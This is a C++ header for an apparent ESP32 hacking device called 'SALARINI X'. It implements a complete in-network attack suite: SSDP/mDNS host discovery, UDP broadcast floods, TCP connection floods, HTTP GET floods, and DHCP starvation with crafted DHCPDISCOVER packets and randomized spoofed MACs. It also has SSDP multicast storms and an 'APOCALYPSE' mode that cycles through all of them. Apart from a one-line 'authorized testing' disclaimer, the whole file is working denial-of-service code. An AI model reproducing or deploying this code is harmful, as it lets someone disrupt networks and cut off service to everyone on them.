/*
  SALARINI X - LanAttacks.h
  ---------------------------------------------------------------------------
  Post-connection LAN attack suite (the "IN-NET" module).

  These attacks run while the board is a NORMAL connected station of the
  target network, using regular TCP/UDP sockets instead of raw frames:

    NET SCAN      SSDP + mDNS discovery sweep -> list of live LAN hosts
    UDP FLOOD     1 KB datagrams at maximum socket rate (broadcast or host)
    TCP FLOOD     connection churn against one host (socket state pressure)
    HTTP FLOOD    serialized HTTP GET flood against a LAN web server
    DHCP STARVE   DHCPDISCOVER storm with randomized client MACs (chaddr +
                  option 61) to exhaust the router lease pool
    SSDP FLOOD    multicast M-SEARCH storm: every UPnP device answers,
                  saturating the network with discovery traffic
    APOCALYPSE    all of the above rotated from one loop

  Pacing follows the global ATTACK POWER setting (LOW / MED / MAX).
  For AUTHORIZED testing on networks you own.
  ---------------------------------------------------------------------------
*/
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <vector>
#include "AttackEngine.h"     // ae::powerLevel() pacing

namespace lan {

enum class Mode : uint8_t {
  OFF = 0, NETSCAN, UDP_FLOOD, TCP_FLOOD, HTTP_FLOOD, DHCP_STARVE, SSDP_FLOOD, APOCALYPSE
};

struct LanHost { String ip; uint16_t port; uint8_t hits; };

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static Mode     sMode = Mode::OFF;
static bool     sRunning = false;
static bool     sScanDone = false;
static uint32_t sStartedMs = 0;
static uint32_t sLastTick = 0;
static uint32_t sPkts = 0, sRate = 0, sWin = 0, sWinMs = 0;
static uint8_t  sPhase = 0;
static uint32_t sScanEndMs = 0;
static IPAddress sTarget;                 // attack target (host)
static uint16_t sTargetPort = 80;
static String   sTargetTxt = "GATEWAY";
static std::vector<LanHost> sHosts;
static WiFiUDP  sUdp;
static bool     sUdpUp = false;
static WiFiClient sTcp[3];
static bool     sTcpBusy[3] = {false,false,false};

static const char SSDP_REQ[] PROGMEM =
  "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n";

// mDNS PTR query for _services._dns-sd._udp.local (service discovery sweep)
static const uint8_t MDNS_Q[] = {
  0x00,0x00, 0x00,0x00, 0x00,0x01, 0x00,0x00, 0x00,0x00, 0x00,0x00,
  0x09,'_','s','e','r','v','i','c','e','s',
  0x07,'_','d','n','s','-','s','d',
  0x04,'_','u','d','p',
  0x05,'l','o','c','a','l', 0x00,
  0x00,0x0C, 0x00,0x01
};

static uint8_t sUdpPayload[1024];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static const char* modeName(Mode m){
  switch(m){
    case Mode::NETSCAN:     return "NET SCAN";
    case Mode::UDP_FLOOD:   return "UDP FLOOD";
    case Mode::TCP_FLOOD:   return "TCP FLOOD";
    case Mode::HTTP_FLOOD:  return "HTTP FLOOD";
    case Mode::DHCP_STARVE: return "DHCP STARVE";
    case Mode::SSDP_FLOOD:  return "SSDP FLOOD";
    case Mode::APOCALYPSE:  return "LAN APOCALYPSE";
    default:                return "OFF";
  }
}

static void udpEnsure(uint16_t port){
  if(sUdpUp) return;
  sUdpUp = (sUdp.begin(port) == 1);
}

static void addHost(const IPAddress &ip, uint16_t port){
  String key = ip.toString();
  for(auto &h : sHosts){
    if(h.ip == key){ h.hits++; if(port && h.port==0) h.port=port; return; }
  }
  if(sHosts.size() >= 24) return;
  LanHost h; h.ip = key; h.port = port; h.hits = 1;
  sHosts.push_back(h);
}

static size_t buildDhcpDiscover(uint8_t *out){
  uint8_t mac[6];
  for(int i=0;i<6;i++) mac[i] = (uint8_t)random(0,256);
  mac[0] = (uint8_t)((mac[0] & 0xFE) | 0x02);   // locally administered
  memset(out, 0, 300);
  out[0] = 1; out[1] = 1; out[2] = 6; out[3] = 0;      // BOOTREQUEST / ethernet
  uint32_t xid = (uint32_t)random(1, 0x7FFFFFF0);
  memcpy(&out[4], &xid, 4);
  out[10] = 0x80; out[11] = 0x00;                       // flags: broadcast reply
  memcpy(&out[28], mac, 6);                             // chaddr (lease key #1)
  out[236] = 0x63; out[237] = 0x82; out[238] = 0x53; out[239] = 0x63;
  int i = 240;
  out[i++] = 53; out[i++] = 1; out[i++] = 1;            // option 53: DISCOVER
  out[i++] = 61; out[i++] = 7; out[i++] = 1;            // option 61: client id
  memcpy(&out[i], mac, 6); i += 6;                      //  (lease key #2)
  static const char HN[] = "salarini-x";
  out[i++] = 12; out[i++] = (uint8_t)(sizeof(HN)-1);
  memcpy(&out[i], HN, sizeof(HN)-1); i += (sizeof(HN)-1);
  out[i++] = 55; out[i++] = 4;                          // parameter request list
  out[i++] = 1;  out[i++] = 3;  out[i++] = 6;  out[i++] = 15;
  out[i++] = 255;                                       // end
  return (size_t)i;
}

static bool sendUdp(const IPAddress &ip, uint16_t port, const uint8_t *data, size_t len){
  if(sUdp.beginPacket(ip, port) != 1) return false;
  sUdp.write(data, len);
  bool ok = (sUdp.endPacket() > 0);
  if(ok){ sPkts++; sWin++; }
  return ok;
}

static void httpOneShot(){
  WiFiClient c;
  c.setTimeout(150);
  if(c.connect(sTarget, sTargetPort) == 1){
    c.print(String("GET / HTTP/1.1\r\nHost: ") + sTargetTxt + "\r\nConnection: close\r\n\r\n");
    sPkts++; sWin++;
  }
  c.stop();
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------
static void stop();

static bool start(Mode m){
  if(m == Mode::OFF) return false;
  if(WiFi.status() != WL_CONNECTED) return false;
  stop();
  sMode = m;
  sRunning = true;
  sScanDone = false;
  sStartedMs = millis();
  sLastTick = 0;
  sPkts = 0; sRate = 0; sWin = 0; sWinMs = millis();
  sPhase = 0;
  sHosts.clear();
  // Default target: the gateway of the connected network.
  sTarget = WiFi.gatewayIP();
  sTargetTxt = "GATEWAY";
  sTargetPort = 80;
  switch(m){
    case Mode::NETSCAN:
      udpEnsure(1901);
      sScanEndMs = millis() + 4000;
      break;
    case Mode::UDP_FLOOD:
      udpEnsure(1902);
      memset(sUdpPayload, 0x58, sizeof(sUdpPayload));
      break;
    case Mode::DHCP_STARVE: udpEnsure(68);   break;
    case Mode::SSDP_FLOOD:  udpEnsure(1902); break;
    case Mode::APOCALYPSE:
      udpEnsure(1902);
      memset(sUdpPayload, 0x58, sizeof(sUdpPayload));
      break;
    default: break;
  }
  Serial.printf("[LAN] start %s target=%s:%u\n", modeName(m), sTargetTxt.c_str(), (unsigned)sTargetPort);
  return true;
}

static void stop(){
  if(sUdpUp){ sUdp.stop(); sUdpUp = false; }
  for(int i=0;i<3;i++){ if(sTcpBusy[i]){ sTcp[i].stop(); sTcpBusy[i]=false; } }
  sRunning = false;
  sMode = Mode::OFF;
  sScanDone = false;   // never leave a stale scan flag for a future attack
  Serial.println("[LAN] stopped");
}

static void setTarget(const String &ipStr, uint16_t port, const char *label){
  IPAddress ip;
  if(ip.fromString(ipStr)){
    sTarget = ip;
    sTargetTxt = label ? String(label) : ipStr;
    if(port) sTargetPort = port;
  }
}

// ---------------------------------------------------------------------------
// Service (call from loop). Non-blocking, paced by ATTACK POWER.
// ---------------------------------------------------------------------------
static uint32_t tickGate(){
  ae::Power p = ae::powerLevel();
  return (p == ae::Power::PWR_LOW) ? 14u
       : (p == ae::Power::PWR_MAX) ? 2u : 5u;
}

static void rateTick(){
  uint32_t now = millis();
  if(now - sWinMs >= 1000){ sRate = sWin; sWin = 0; sWinMs = now; }
}

static void service(){
  if(!sRunning) return;
  rateTick();
  uint32_t now = millis();
  uint32_t gate = tickGate();

  switch(sMode){
    case Mode::NETSCAN:
    {
      if(now < sScanEndMs){
        if(now - sLastTick >= 350){
          sLastTick = now;
          sendUdp(IPAddress(239,255,255,250), 1900,
                  (const uint8_t*)SSDP_REQ, strlen(SSDP_REQ));
          sendUdp(IPAddress(224,0,0,251), 5353, MDNS_Q, sizeof(MDNS_Q));
        }
        int sz;
        int guard = 0;
        while((sz = sUdp.parsePacket()) > 0 && guard++ < 12){
          IPAddress rip = sUdp.remoteIP();
          uint16_t rp  = sUdp.remotePort();
          if(rp != 1901) addHost(rip, rp);
        }
        return;
      }
      // Sweep finished: pin the gateway as the first entry and stop.
      addHost(WiFi.gatewayIP(), 80);
      sRunning = false;
      sMode = Mode::OFF;
      sScanDone = true;
      Serial.printf("[LAN] net scan done: %u hosts\n", (unsigned)sHosts.size());
      return;
    }
    case Mode::UDP_FLOOD:
    {
      if(now - sLastTick < gate) return;
      sLastTick = now;
      // Broadcast segment flood unless the user picked a specific host.
      if(sTargetTxt == "GATEWAY"){
        IPAddress bc; bc.fromString("255.255.255.255");
        sendUdp(bc, 9, sUdpPayload, sizeof(sUdpPayload));
      } else {
        sendUdp(sTarget, sTargetPort ? sTargetPort : 9, sUdpPayload, sizeof(sUdpPayload));
      }
      return;
    }
    case Mode::TCP_FLOOD:
    {
      if(now - sLastTick < gate) return;
      sLastTick = now;
      uint8_t idx = sPhase % 3;
      sPhase++;
      if(sTcpBusy[idx]){ sTcp[idx].stop(); sTcpBusy[idx] = false; }
      sTcp[idx].setTimeout(150);
      if(sTcp[idx].connect(sTarget, sTargetPort) == 1){
        sTcpBusy[idx] = true;
        sPkts++; sWin++;
      }
      return;
    }
    case Mode::HTTP_FLOOD:
    {
      if(now - sLastTick < gate + 3u) return;
      sLastTick = now;
      httpOneShot();
      return;
    }
    case Mode::DHCP_STARVE:
    {
      if(now - sLastTick < gate + 8u) return;
      sLastTick = now;
      uint8_t pkt[300];
      for(int k=0;k<2;k++){
        size_t len = buildDhcpDiscover(pkt);
        IPAddress bc; bc.fromString("255.255.255.255");
        if(sUdp.beginPacket(bc, 67) == 1){
          sUdp.write(pkt, len);
          if(sUdp.endPacket() > 0){ sPkts++; sWin++; }
        }
      }
      return;
    }
    case Mode::SSDP_FLOOD:
    {
      if(now - sLastTick < gate) return;
      sLastTick = now;
      sendUdp(IPAddress(239,255,255,250), 1900,
              (const uint8_t*)SSDP_REQ, strlen(SSDP_REQ));
      return;
    }
    case Mode::APOCALYPSE:
    {
      if(now - sLastTick < gate) return;
      sLastTick = now;
      switch(sPhase % 4){
        case 0: {
          IPAddress bc; bc.fromString("255.255.255.255");
          sendUdp(bc, 9, sUdpPayload, sizeof(sUdpPayload));
          break;
        }
        case 1:
          sendUdp(IPAddress(239,255,255,250), 1900,
                  (const uint8_t*)SSDP_REQ, strlen(SSDP_REQ));
          break;
        case 2: {
          uint8_t pkt[300];
          size_t len = buildDhcpDiscover(pkt);
          IPAddress bc; bc.fromString("255.255.255.255");
          if(sUdp.beginPacket(bc, 67) == 1){
            sUdp.write(pkt, len);
            if(sUdp.endPacket() > 0){ sPkts++; sWin++; }
          }
          break;
        }
        default:
          if(sTargetTxt != "GATEWAY" || true) httpOneShot();
          break;
      }
      sPhase++;
      return;
    }
    default: stop(); return;
  }
}

// ---------------------------------------------------------------------------
// UI accessors
// ---------------------------------------------------------------------------
static bool   active(){ return sRunning; }
static Mode   mode(){ return sMode; }
static bool   scanDone(){ return sScanDone; }
static void   clearScanDone(){ sScanDone = false; }
static uint32_t pktCount(){ return sPkts; }
static uint32_t rate(){ return sRate; }
static uint32_t startedMs(){ return sStartedMs; }
static size_t   hostCount(){ return sHosts.size(); }
static const LanHost* hostAt(size_t i){ return (i < sHosts.size()) ? &sHosts[i] : nullptr; }
static const String& targetText(){ return sTargetTxt; }

} // namespace lan
